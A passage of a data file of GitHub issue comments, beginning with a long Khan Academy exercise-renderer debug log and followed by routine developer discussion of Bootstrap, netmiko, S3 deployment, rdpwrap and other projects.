undefined) running tmpl ran tmpl running tex MathJax done typesetting (7/4) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting (1\ 3/4) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting (0.75) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) loading and rendering solving_for_the_y-intercept loaded solving_for_the_y-intercept, now rendering (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (raphaelCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (math-formatCleanup not a fn; src undefined) (expressionsCleanup not a fn; src undefined) (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (raphaelCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (math-formatCleanup not a fn; src undefined) (expressionsCleanup not a fn; src undefined) start of makeProblem chose problem type and seed for solving_for_the_y-intercept cloned problem cloned global elements ran tmplApply to vars and main elements ran tmplApply to [id] removed hints from DOM evaled inline scripts added inline styles (answer-typesLoad not a fn; src undefined) running tmplLoad ran tmplLoad (texLoad not a fn; src undefined) (jquery.adhesionLoad not a fn; src undefined) (calculatorLoad not a fn; src undefined) (mathLoad not a fn; src undefined) (raphaelLoad not a fn; src undefined) (graphieLoad not a fn; src undefined) (math-formatLoad not a fn; src undefined) (expressionsLoad not a fn; src undefined) done with runModules Load (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting (6x + 9y = -81) MathJax done typesetting (y) MathJax done typesetting (\large(0,\ ) MathJax done typesetting (\large)) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) done with runModules decided on answer type multiple (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting (\large(0,\ ) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting (\large)) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) validator created MathJax done typesetting (\large(0,\ ) MathJax done typesetting (\large)) loading and rendering solving_for_the_y-intercept loaded solving_for_the_y-intercept, now rendering (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (raphaelCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (math-formatCleanup not a fn; src undefined) (expressionsCleanup not a fn; src undefined) (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (raphaelCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (math-formatCleanup not a fn; src undefined) (expressionsCleanup not a fn; src undefined) start of makeProblem chose problem type and seed for solving_for_the_y-intercept cloned problem cloned global elements ran tmplApply to vars and main elements ran tmplApply to [id] removed hints from DOM evaled inline scripts added inline styles (answer-typesLoad not a fn; src undefined) running tmplLoad ran tmplLoad (texLoad not a fn; src undefined) (jquery.adhesionLoad not a fn; src undefined) (calculatorLoad not a fn; src undefined) (mathLoad not a fn; src undefined) (raphaelLoad not a fn; src undefined) (graphieLoad not a fn; src undefined) (math-formatLoad not a fn; src undefined) (expressionsLoad not a fn; src undefined) done with runModules Load (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting (-6x + 5y = -15) MathJax done typesetting (y) MathJax done typesetting (\large(0,\ ) MathJax done typesetting (\large)) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) done with runModules decided on answer type multiple (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting (\large(0,\ ) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting (\large)) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) validator created MathJax done typesetting (\large(0,\ ) MathJax done typesetting (\large)) loading and rendering solving_for_the_y-intercept loaded solving_for_the_y-intercept, now rendering (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (raphaelCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (math-formatCleanup not a fn; src undefined) (expressionsCleanup not a fn; src undefined) (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (raphaelCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (math-formatCleanup not a fn; src undefined) (expressionsCleanup not a fn; src undefined) start of makeProblem chose problem type and seed for solving_for_the_y-intercept cloned problem cloned global elements ran tmplApply to vars and main elements ran tmplApply to [id] removed hints from DOM evaled inline scripts added inline styles (answer-typesLoad not a fn; src undefined) running tmplLoad ran tmplLoad (texLoad not a fn; src undefined) (jquery.adhesionLoad not a fn; src undefined) (calculatorLoad not a fn; src undefined) (mathLoad not a fn; src undefined) (raphaelLoad not a fn; src undefined) (graphieLoad not a fn; src undefined) (math-formatLoad not a fn; src undefined) (expressionsLoad not a fn; src undefined) done with runModules Load (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting ((10, -5)) MathJax done typesetting (y = -\dfrac{5}{3} x + b) MathJax done typesetting (y) MathJax done typesetting (b) MathJax done typesetting (b =) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) done with runModules decided on answer type multiple (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting (b =) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) validator created MathJax done typesetting (b =) loading and rendering solving_for_the_y-intercept loaded solving_for_the_y-intercept, now rendering (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (raphaelCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (math-formatCleanup not a fn; src undefined) (expressionsCleanup not a fn; src undefined) (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (raphaelCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (math-formatCleanup not a fn; src undefined) (expressionsCleanup not a fn; src undefined) start of makeProblem chose problem type and seed for solving_for_the_y-intercept cloned problem cloned global elements ran tmplApply to vars and main elements ran tmplApply to [id] removed hints from DOM evaled inline scripts added inline styles (answer-typesLoad not a fn; src undefined) running tmplLoad ran tmplLoad (texLoad not a fn; src undefined) (jquery.adhesionLoad not a fn; src undefined) (calculatorLoad not a fn; src undefined) (mathLoad not a fn; src undefined) (raphaelLoad not a fn; src undefined) (graphieLoad not a fn; src undefined) (math-formatLoad not a fn; src undefined) (expressionsLoad not a fn; src undefined) done with runModules Load (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting ((9, -7)) MathJax done typesetting (y = -\dfrac{1}{3} x + b) MathJax done typesetting (y) MathJax done typesetting (b) MathJax done typesetting (b =) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) done with runModules decided on answer type multiple (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting (b =) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (math-format not a fn; src undefined) (expressions not a fn; src undefined) validator created MathJax done typesetting (b =) startTask... startTask got task undefined startTask... startTask got task undefined loadExercise start number_line.html loadExercise start comparing_fractions_1.html loading and rendering recognizing_conic_sections loadExercise start recognizing_conic_sections.html loadExercise got comparing_fractions_1.html loadExercise submod math loadExercise submod graphie loadExercise submod graphie-helpers loadModule mod /khan-exercises/utils/graphie-helpers.js loadExercise submod word-problems loadExercise submod answer-types loadExercise submod tmpl loadExercise submod tex loadExercise submod jquery.adhesion loadExercise submod calculator loadExercise submod /khan-exercises/utils/MathJax/2.1/MathJax.js?config=KAthJax-da9a7f53e588f3837b045a600e1dc439 loadExercise finish comparing_fractions_1.html loadExercise got number_line.html loadExercise submod math loadExercise submod graphie loadExercise submod word-problems loadExercise submod interactive loadModule mod /khan-exercises/utils/interactive.js loadModule mod /khan-exercises/utils/jquery.mobile.vmouse.js loadExercise submod answer-types loadExercise submod tmpl loadExercise submod tex loadExercise submod jquery.adhesion loadExercise submod calculator loadExercise submod /khan-exercises/utils/MathJax/2.1/MathJax.js?config=KAthJax-da9a7f53e588f3837b045a600e1dc439 loadExercise finish number_line.html loadExercise got recognizing_conic_sections.html loadExercise submod math loadExercise submod math-format loadExercise submod graphie loadExercise submod answer-types loadExercise submod tmpl loadExercise submod tex loadExercise submod jquery.adhesion loadExercise submod calculator loadExercise submod /khan-exercises/utils/MathJax/2.1/MathJax.js?config=KAthJax-da9a7f53e588f3837b045a600e1dc439 loadExercise finish recognizing_conic_sections.html loaded recognizing_conic_sections, now rendering (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (raphaelCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (math-formatCleanup not a fn; src undefined) (expressionsCleanup not a fn; src undefined) (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (raphaelCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (math-formatCleanup not a fn; src undefined) (expressionsCleanup not a fn; src undefined) start of makeProblem chose problem type and seed for recognizing_conic_sections cloned problem cloned global elements ran tmplApply to vars and main elements ran tmplApply to [id] removed hints from DOM evaled inline scripts added inline styles (answer-typesLoad not a fn; src undefined) running tmplLoad ran tmplLoad (texLoad not a fn; src undefined) (jquery.adhesionLoad not a fn; src undefined) (calculatorLoad not a fn; src undefined) (mathLoad not a fn; src undefined) (raphaelLoad not a fn; src undefined) (math-formatLoad not a fn; src undefined) (expressionsLoad not a fn; src undefined) (graphieLoad not a fn; src undefined) done with runModules Load (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) (math-format not a fn; src undefined) (expressions not a fn; src undefined) running graphie ran graphie done with runModules decided on answer type radio (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) (math-format not a fn; src undefined) (expressions not a fn; src undefined) running graphie ran graphie validator created loadExercise start dividing_fractions_word_problems.html loading and rendering number_line loaded number_line, now rendering (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (raphaelCleanup not a fn; src undefined) (math-formatCleanup not a fn; src undefined) (expressionsCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (raphaelCleanup not a fn; src undefined) (math-formatCleanup not a fn; src undefined) (expressionsCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) start of makeProblem chose problem type and seed for number_line cloned problem cloned global elements ran tmplApply to vars and main elements ran tmplApply to [id] removed hints from DOM evaled inline scripts added inline styles (answer-typesLoad not a fn; src undefined) running tmplLoad ran tmplLoad (texLoad not a fn; src undefined) (jquery.adhesionLoad not a fn; src undefined) (calculatorLoad not a fn; src undefined) (mathLoad not a fn; src undefined) (raphaelLoad not a fn; src undefined) (graphieLoad not a fn; src undefined) running word-problemsLoad ran word-problemsLoad (interactiveLoad not a fn; src undefined) (jquery.mobile.vmouseLoad not a fn; src undefined) done with runModules Load (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting (24) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie MathJax done typesetting (0) MathJax done typesetting (4) ran graphie (word-problems not a fn; src undefined) (interactive not a fn; src undefined) (jquery.mobile.vmouse not a fn; src undefined) done with runModules decided on answer type custom (answer-types not a fn; src undefined) running tmpl ran tmpl running tex ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (word-problems not a fn; src undefined) (interactive not a fn; src undefined) (jquery.mobile.vmouse not a fn; src undefined) validator created loadExercise got dividing_fractions_word_problems.html loadExercise submod math loadExercise submod math-format loadExercise submod word-problems loadExercise submod spin loadModule mod /khan-exercises/utils/spin.js loadExercise submod answer-types loadExercise submod tmpl loadExercise submod tex loadExercise submod jquery.adhesion loadExercise submod calculator loadExercise submod /khan-exercises/utils/MathJax/2.1/MathJax.js?config=KAthJax-da9a7f53e588f3837b045a600e1dc439 loadExercise finish dividing_fractions_word_problems.html loadExercise start graphing_points.html loading and rendering comparing_fractions_1 loaded comparing_fractions_1, now rendering (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (raphaelCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (word-problemsCleanup not a fn; src undefined) (interactiveCleanup not a fn; src undefined) (jquery.mobile.vmouseCleanup not a fn; src undefined) (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (raphaelCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (word-problemsCleanup not a fn; src undefined) (interactiveCleanup not a fn; src undefined) (jquery.mobile.vmouseCleanup not a fn; src undefined) start of makeProblem chose problem type and seed for comparing_fractions_1 cloned problem cloned global elements ran tmplApply to vars and main elements ran tmplApply to [id] removed hints from DOM evaled inline scripts added inline styles (answer-typesLoad not a fn; src undefined) running tmplLoad ran tmplLoad (texLoad not a fn; src undefined) (jquery.adhesionLoad not a fn; src undefined) (calculatorLoad not a fn; src undefined) (mathLoad not a fn; src undefined) (raphaelLoad not a fn; src undefined) (graphieLoad not a fn; src undefined) (graphie-helpersLoad not a fn; src undefined) (math-formatLoad not a fn; src undefined) (expressionsLoad not a fn; src undefined) running word-problemsLoad ran word-problemsLoad done with runModules Load (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting (\dfrac{11}{14}) MathJax done typesetting (\dfrac{11}{12}) MathJax done typesetting (&lt;) MathJax done typesetting (&lt;) MathJax done typesetting (&gt;) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (graphie-helpers not a fn; src undefined) (math-format not a fn; src undefined) (expressions not a fn; src undefined) (word-problems not a fn; src undefined) done with runModules decided on answer type radio (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting (&lt;) MathJax done typesetting (&gt;) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) running graphie ran graphie (graphie-helpers not a fn; src undefined) (math-format not a fn; src undefined) (expressions not a fn; src undefined) (word-problems not a fn; src undefined) validator created MathJax done typesetting (&lt;) MathJax done typesetting (&gt;) loadExercise got graphing_points.html loadExercise submod math loadExercise submod interactive loadExercise submod graphie loadExercise submod answer-types loadExercise submod tmpl loadExercise submod tex loadExercise submod jquery.adhesion loadExercise submod calculator loadExercise submod /khan-exercises/utils/MathJax/2.1/MathJax.js?config=KAthJax-da9a7f53e588f3837b045a600e1dc439 loadExercise finish graphing_points.html loading and rendering dividing_fractions_word_problems loaded dividing_fractions_word_problems, now rendering (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (raphaelCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (graphie-helpersCleanup not a fn; src undefined) (math-formatCleanup not a fn; src undefined) (expressionsCleanup not a fn; src undefined) (word-problemsCleanup not a fn; src undefined) (answer-typesCleanup not a fn; src undefined) (tmplCleanup not a fn; src undefined) running texCleanup ran texCleanup (jquery.adhesionCleanup not a fn; src undefined) (calculatorCleanup not a fn; src undefined) (mathCleanup not a fn; src undefined) (raphaelCleanup not a fn; src undefined) (graphieCleanup not a fn; src undefined) (graphie-helpersCleanup not a fn; src undefined) (math-formatCleanup not a fn; src undefined) (expressionsCleanup not a fn; src undefined) (word-problemsCleanup not a fn; src undefined) start of makeProblem chose problem type and seed for dividing_fractions_word_problems cloned problem cloned global elements ran tmplApply to vars and main elements ran tmplApply to [id] removed hints from DOM evaled inline scripts added inline styles (answer-typesLoad not a fn; src undefined) running tmplLoad ran tmplLoad (texLoad not a fn; src undefined) (jquery.adhesionLoad not a fn; src undefined) (calculatorLoad not a fn; src undefined) (mathLoad not a fn; src undefined) (raphaelLoad not a fn; src undefined) (math-formatLoad not a fn; src undefined) (expressionsLoad not a fn; src undefined) running word-problemsLoad ran word-problemsLoad (spinLoad not a fn; src undefined) done with runModules Load (answer-types not a fn; src undefined) running tmpl ran tmpl running tex MathJax done typesetting (\frac{1}{8}) ran tex (jquery.adhesion not a fn; src undefined) (calculator not a fn; src undefined) (math not a fn; src undefined) (raphael not a fn; src undefined) (math-format not a fn; src undefined) (expressions not a fn; src undefined) (word-problems not a fn; src undefined) running spin ran spin done with runModules decided on answer type number validator created ",False,True
i2cdevlib/jrowberg/252/264212617,i2cdevlib/jrowberg/252,"Actually this one looks more close to mine -&gt;  cheaper the better cause here in brazil they only sell garbage, so you should probably try to find the shittiest/cheapest arduino and try it out. ",False,True
rdpwrap/stascorp/601/446096240,rdpwrap/stascorp/601,"@friend, @ Hajubu wrote But the version in the eventlog refers to svchost.exe, which is .1, not .168, so nothing strange there. This process runs as local system, hence the error 5 (0xc00000005) is odd. I am not sure about the order of the section in the ini file (normally it should  not matter), but to be safe I would put [10.0.17763.168] around the middle, just above [SLInit] section and [...168-SLInit] at the bottom of the ini file. ",False,True
kinbody_detector/personalrobotics/3/146150050,kinbody_detector/personalrobotics/3,"Need to fix Update() in kinbody_detector.py so each kinbody can be either 'added' or 'updated', never both. ",False,True
bety/PecanProject/568/367790098,bety/PecanProject/568,"Found one error—the model ""show"" pages, e.g.   Will fix before pulling. ",False,True
godot/godotengine/28739/490151913,godot/godotengine/28739,@friend Do you have any log? ,False,True
bootstrap/twbs/3057/5137454,bootstrap/twbs/3057,"@friend Regardless of whether you consider this usage of ASI a bug, it'd be ignorant not to acknowledge that there certainly is a bug in JSMin. ",False,True
openvpn-client/dperson/165/445474064,openvpn-client/dperson/165,"I don't think it a good idea to use link. We should create a network first, then find a way to put all the traffic through the vpn gateway. So did you manually write a gateway inside your other containers? ",False,True
bootstrap/twbs/3057/5136998,bootstrap/twbs/3057,I know who @friend is but who is this @friend fellow? ,False,True
bootstrap/twbs/3057/5141206,bootstrap/twbs/3057,Thank for not using semicolons =) Semicolons -1 ,False,True
scratch-blocks/LLK/1840/450717132,scratch-blocks/LLK/1840,"Google Translate is an opt-in by virtue of the fact that it's an extension! If you don't explicitly include the extension, you can't use the blocks and have therefore not opted in. By including the extension, you are obviously showing that you are opting in to using the extension. A disclaimer is necessary but should not be obtrusive. ",False,True
bootstrap/twbs/3057/5139749,bootstrap/twbs/3057,Or just use UglifyJS? I don't recall it having problems with that issue. ,False,True
termux-packages/termux/2735/413330573,termux-packages/termux/2735,Does anyone have any idea why just Termux busybox tar generates signal 1? ,False,True
scratch-blocks/LLK/1489/393521599,scratch-blocks/LLK/1489,After further discussion we have decided to keep these colors as-is in an effort to unify colors / grammars across ScratchJr and Scratch. ,False,True
netmiko/ktbyers/1074/401316896,netmiko/ktbyers/1074,"Exception while executing configure terminal related commands for mellanox switch. when enabled the debug logs, found that the command to enter the ""config terminal"" of mellanox switch is partial and requires additional command to enter the ""config terminal"". correct sequence of command after successful ssh to mellanox switch is 1&gt; enable 2&gt; configure terminal thus, the small change in ""mellanox_ssh.py"" code is required as below (#change required 1 and #change required 2) def config_mode(self, config_command='config term', pattern='#')            #change required 1       enter_enable = 'enable'     """"""Enter into config_mode.""""""     output = ''     if not self.check_config_mode()        #change required 2         self.write_channel(self.normalize_cmd(enter_enable))         self.write_channel(self.normalize_cmd(config_command))         output = self.read_until_pattern(pattern=pattern)         if not self.check_config_mode()             raise ValueError(""Failed to enter configuration mode."")     return output  With this change the configure terminal relates command gets executed successfully. added the debug logs for ssh test to mellanox switch  before and after code change. After_code_change.log Error_without_code_change.log ",False,True
manageiq/ManageIQ/1210/67412097,manageiq/ManageIQ/1210,@friend I got this to repeat locally.  Trying to understand what's going on. ,False,True
serverless-stack-com/AnomalyInnovations/63/350741544,serverless-stack-com/AnomalyInnovations/63,"Hi, I created my S3 bucket and went to do npm run build and I deployed the build/ file to the S3 bucket I created.  In AWS the bucket shows up with all the files created in the build file, however when I go to the endpoint, the url where my app should be live, it shows up with the favicon icon but the screen is blank and the error i get from the console is  Failed to load resource the server responded with a status of 404 (Not Found) main.f5cd3d98.js Failed to load resource the server responded with a status of 404 (Not Found) main.0e9b8740.css Failed to load resource the server responded with a status of 404 (Not Found) I understand that it is not reading the static files created during the build but I cannot seem to figure out how to fix this error? Hopefully someone can help me please? Thanks ) ",False,True
manageiq/ManageIQ/1210/114590930,manageiq/ManageIQ/1210,@friend @friend What is the status of this PR? ,False,True
freeCodeCamp/freeCodeCamp/10163/170647469,freeCodeCamp/freeCodeCamp/10163,  The MDN links and other help links do not show up on the beta site. Screenshot   Regular site  Beta site  ,False,True
zfs/zfsonlinux/7960/436129493,zfs/zfsonlinux/7960,"Hello. Anything on this? Because of some commit (I think it is related to  I can't use dappersec kernel anymore. I also tried with 4.9.132-dappersec, and the error is the same. It was always compatible with grsecurity patches, please fix it. Thanks so much ",False,True
hyrise/hyrise/1602/433469603,hyrise/hyrise/1602,"It seems unsafe to have an unlocked access method in addition to .  should go. For example, this looks dangerous  refactoring that part of the projection, we might also pass in the MVCC data directly instead of making the chunk resize the vectors first and replace them afterwards. 749 might make the  part superfluous, but we should still look at the projection. ",False,True
coffeescript/jashkenas/4056/127761537,coffeescript/jashkenas/4056,"If you're using CS for browser code, then use browserify with coffeeify.  Making the user take the performance hit of local transpilation is probably a bad idea. ",False,True
bootstrap/twbs/3057/5150193,bootstrap/twbs/3057,Mikeal wrote a very good post about - why no semicolons - and I agree 100% ,False,True
jekyll/jekyll/6948/386856025,jekyll/jekyll/6948,Jekyll Core doesn't handle pre-processing css and javascript. We have two plugins (both are written in Ruby)  (included in  by default) and . The speed improvements are probably due to the difference between  and ,False,True
react-native-camera/react-native-community/1897/440945085,react-native-camera/react-native-community/1897,"I have the same problem; ""react-native-camera"" ""1.4.3"",  &lt;uses-permission androidname=""android.permission.CAMERA""/&gt; &lt;uses-permission androidname=""android.permission.RECORD_AUDIO""/&gt;     &lt;uses-permission androidname=""android.permission.RECORD_VIDEO""/&gt;     &lt;uses-permission androidname=""android.permission.READ_EXTERNAL_STORAGE"" /&gt;     &lt;uses-permission androidname=""android.permission.WRITE_EXTERNAL_STORAGE"" /&gt; ext {     buildToolsVersion = ""26.0.3""     minSdkVersion = 16     compileSdkVersion = 26     targetSdkVersion = 26     googlePlayServicesVersion = ""12.0.1""     supportLibVersion = ""27.1.0"" } Error setAudioSource failed. when I click recordAsync, simulator crash;  😫😫😫 ",False,True
ansible/ansible/13262/321085289,ansible/ansible/13262,plus one ...to the developer that takes this on ,False,True
tweakCompatible/jlippold/89371/450384565,tweakCompatible/jlippold/89371,,False,True
homebrew-cask/Homebrew/52035/422215464,homebrew-cask/Homebrew/52035,"@friend Thank you for your clarification. And yes, though it may seem like a rather long reply, you've set out your points fairly, and as you say, much of it can be reused easily in other situations. In this case I would have appreciated if @friend had said outright something like ""running brew not as the current user"" is not officially supported. (I know it's never been supported to run it as the super user, but that's a slightly different matter.) Anyway, I'm sorry if I came off antagonistic, @friend. Hopefully I can by myself get brewdo working again with cask, and get a PR accepted here too as part of that, if the situation demands it. I'll try to remember to report back here if I do! ",False,True
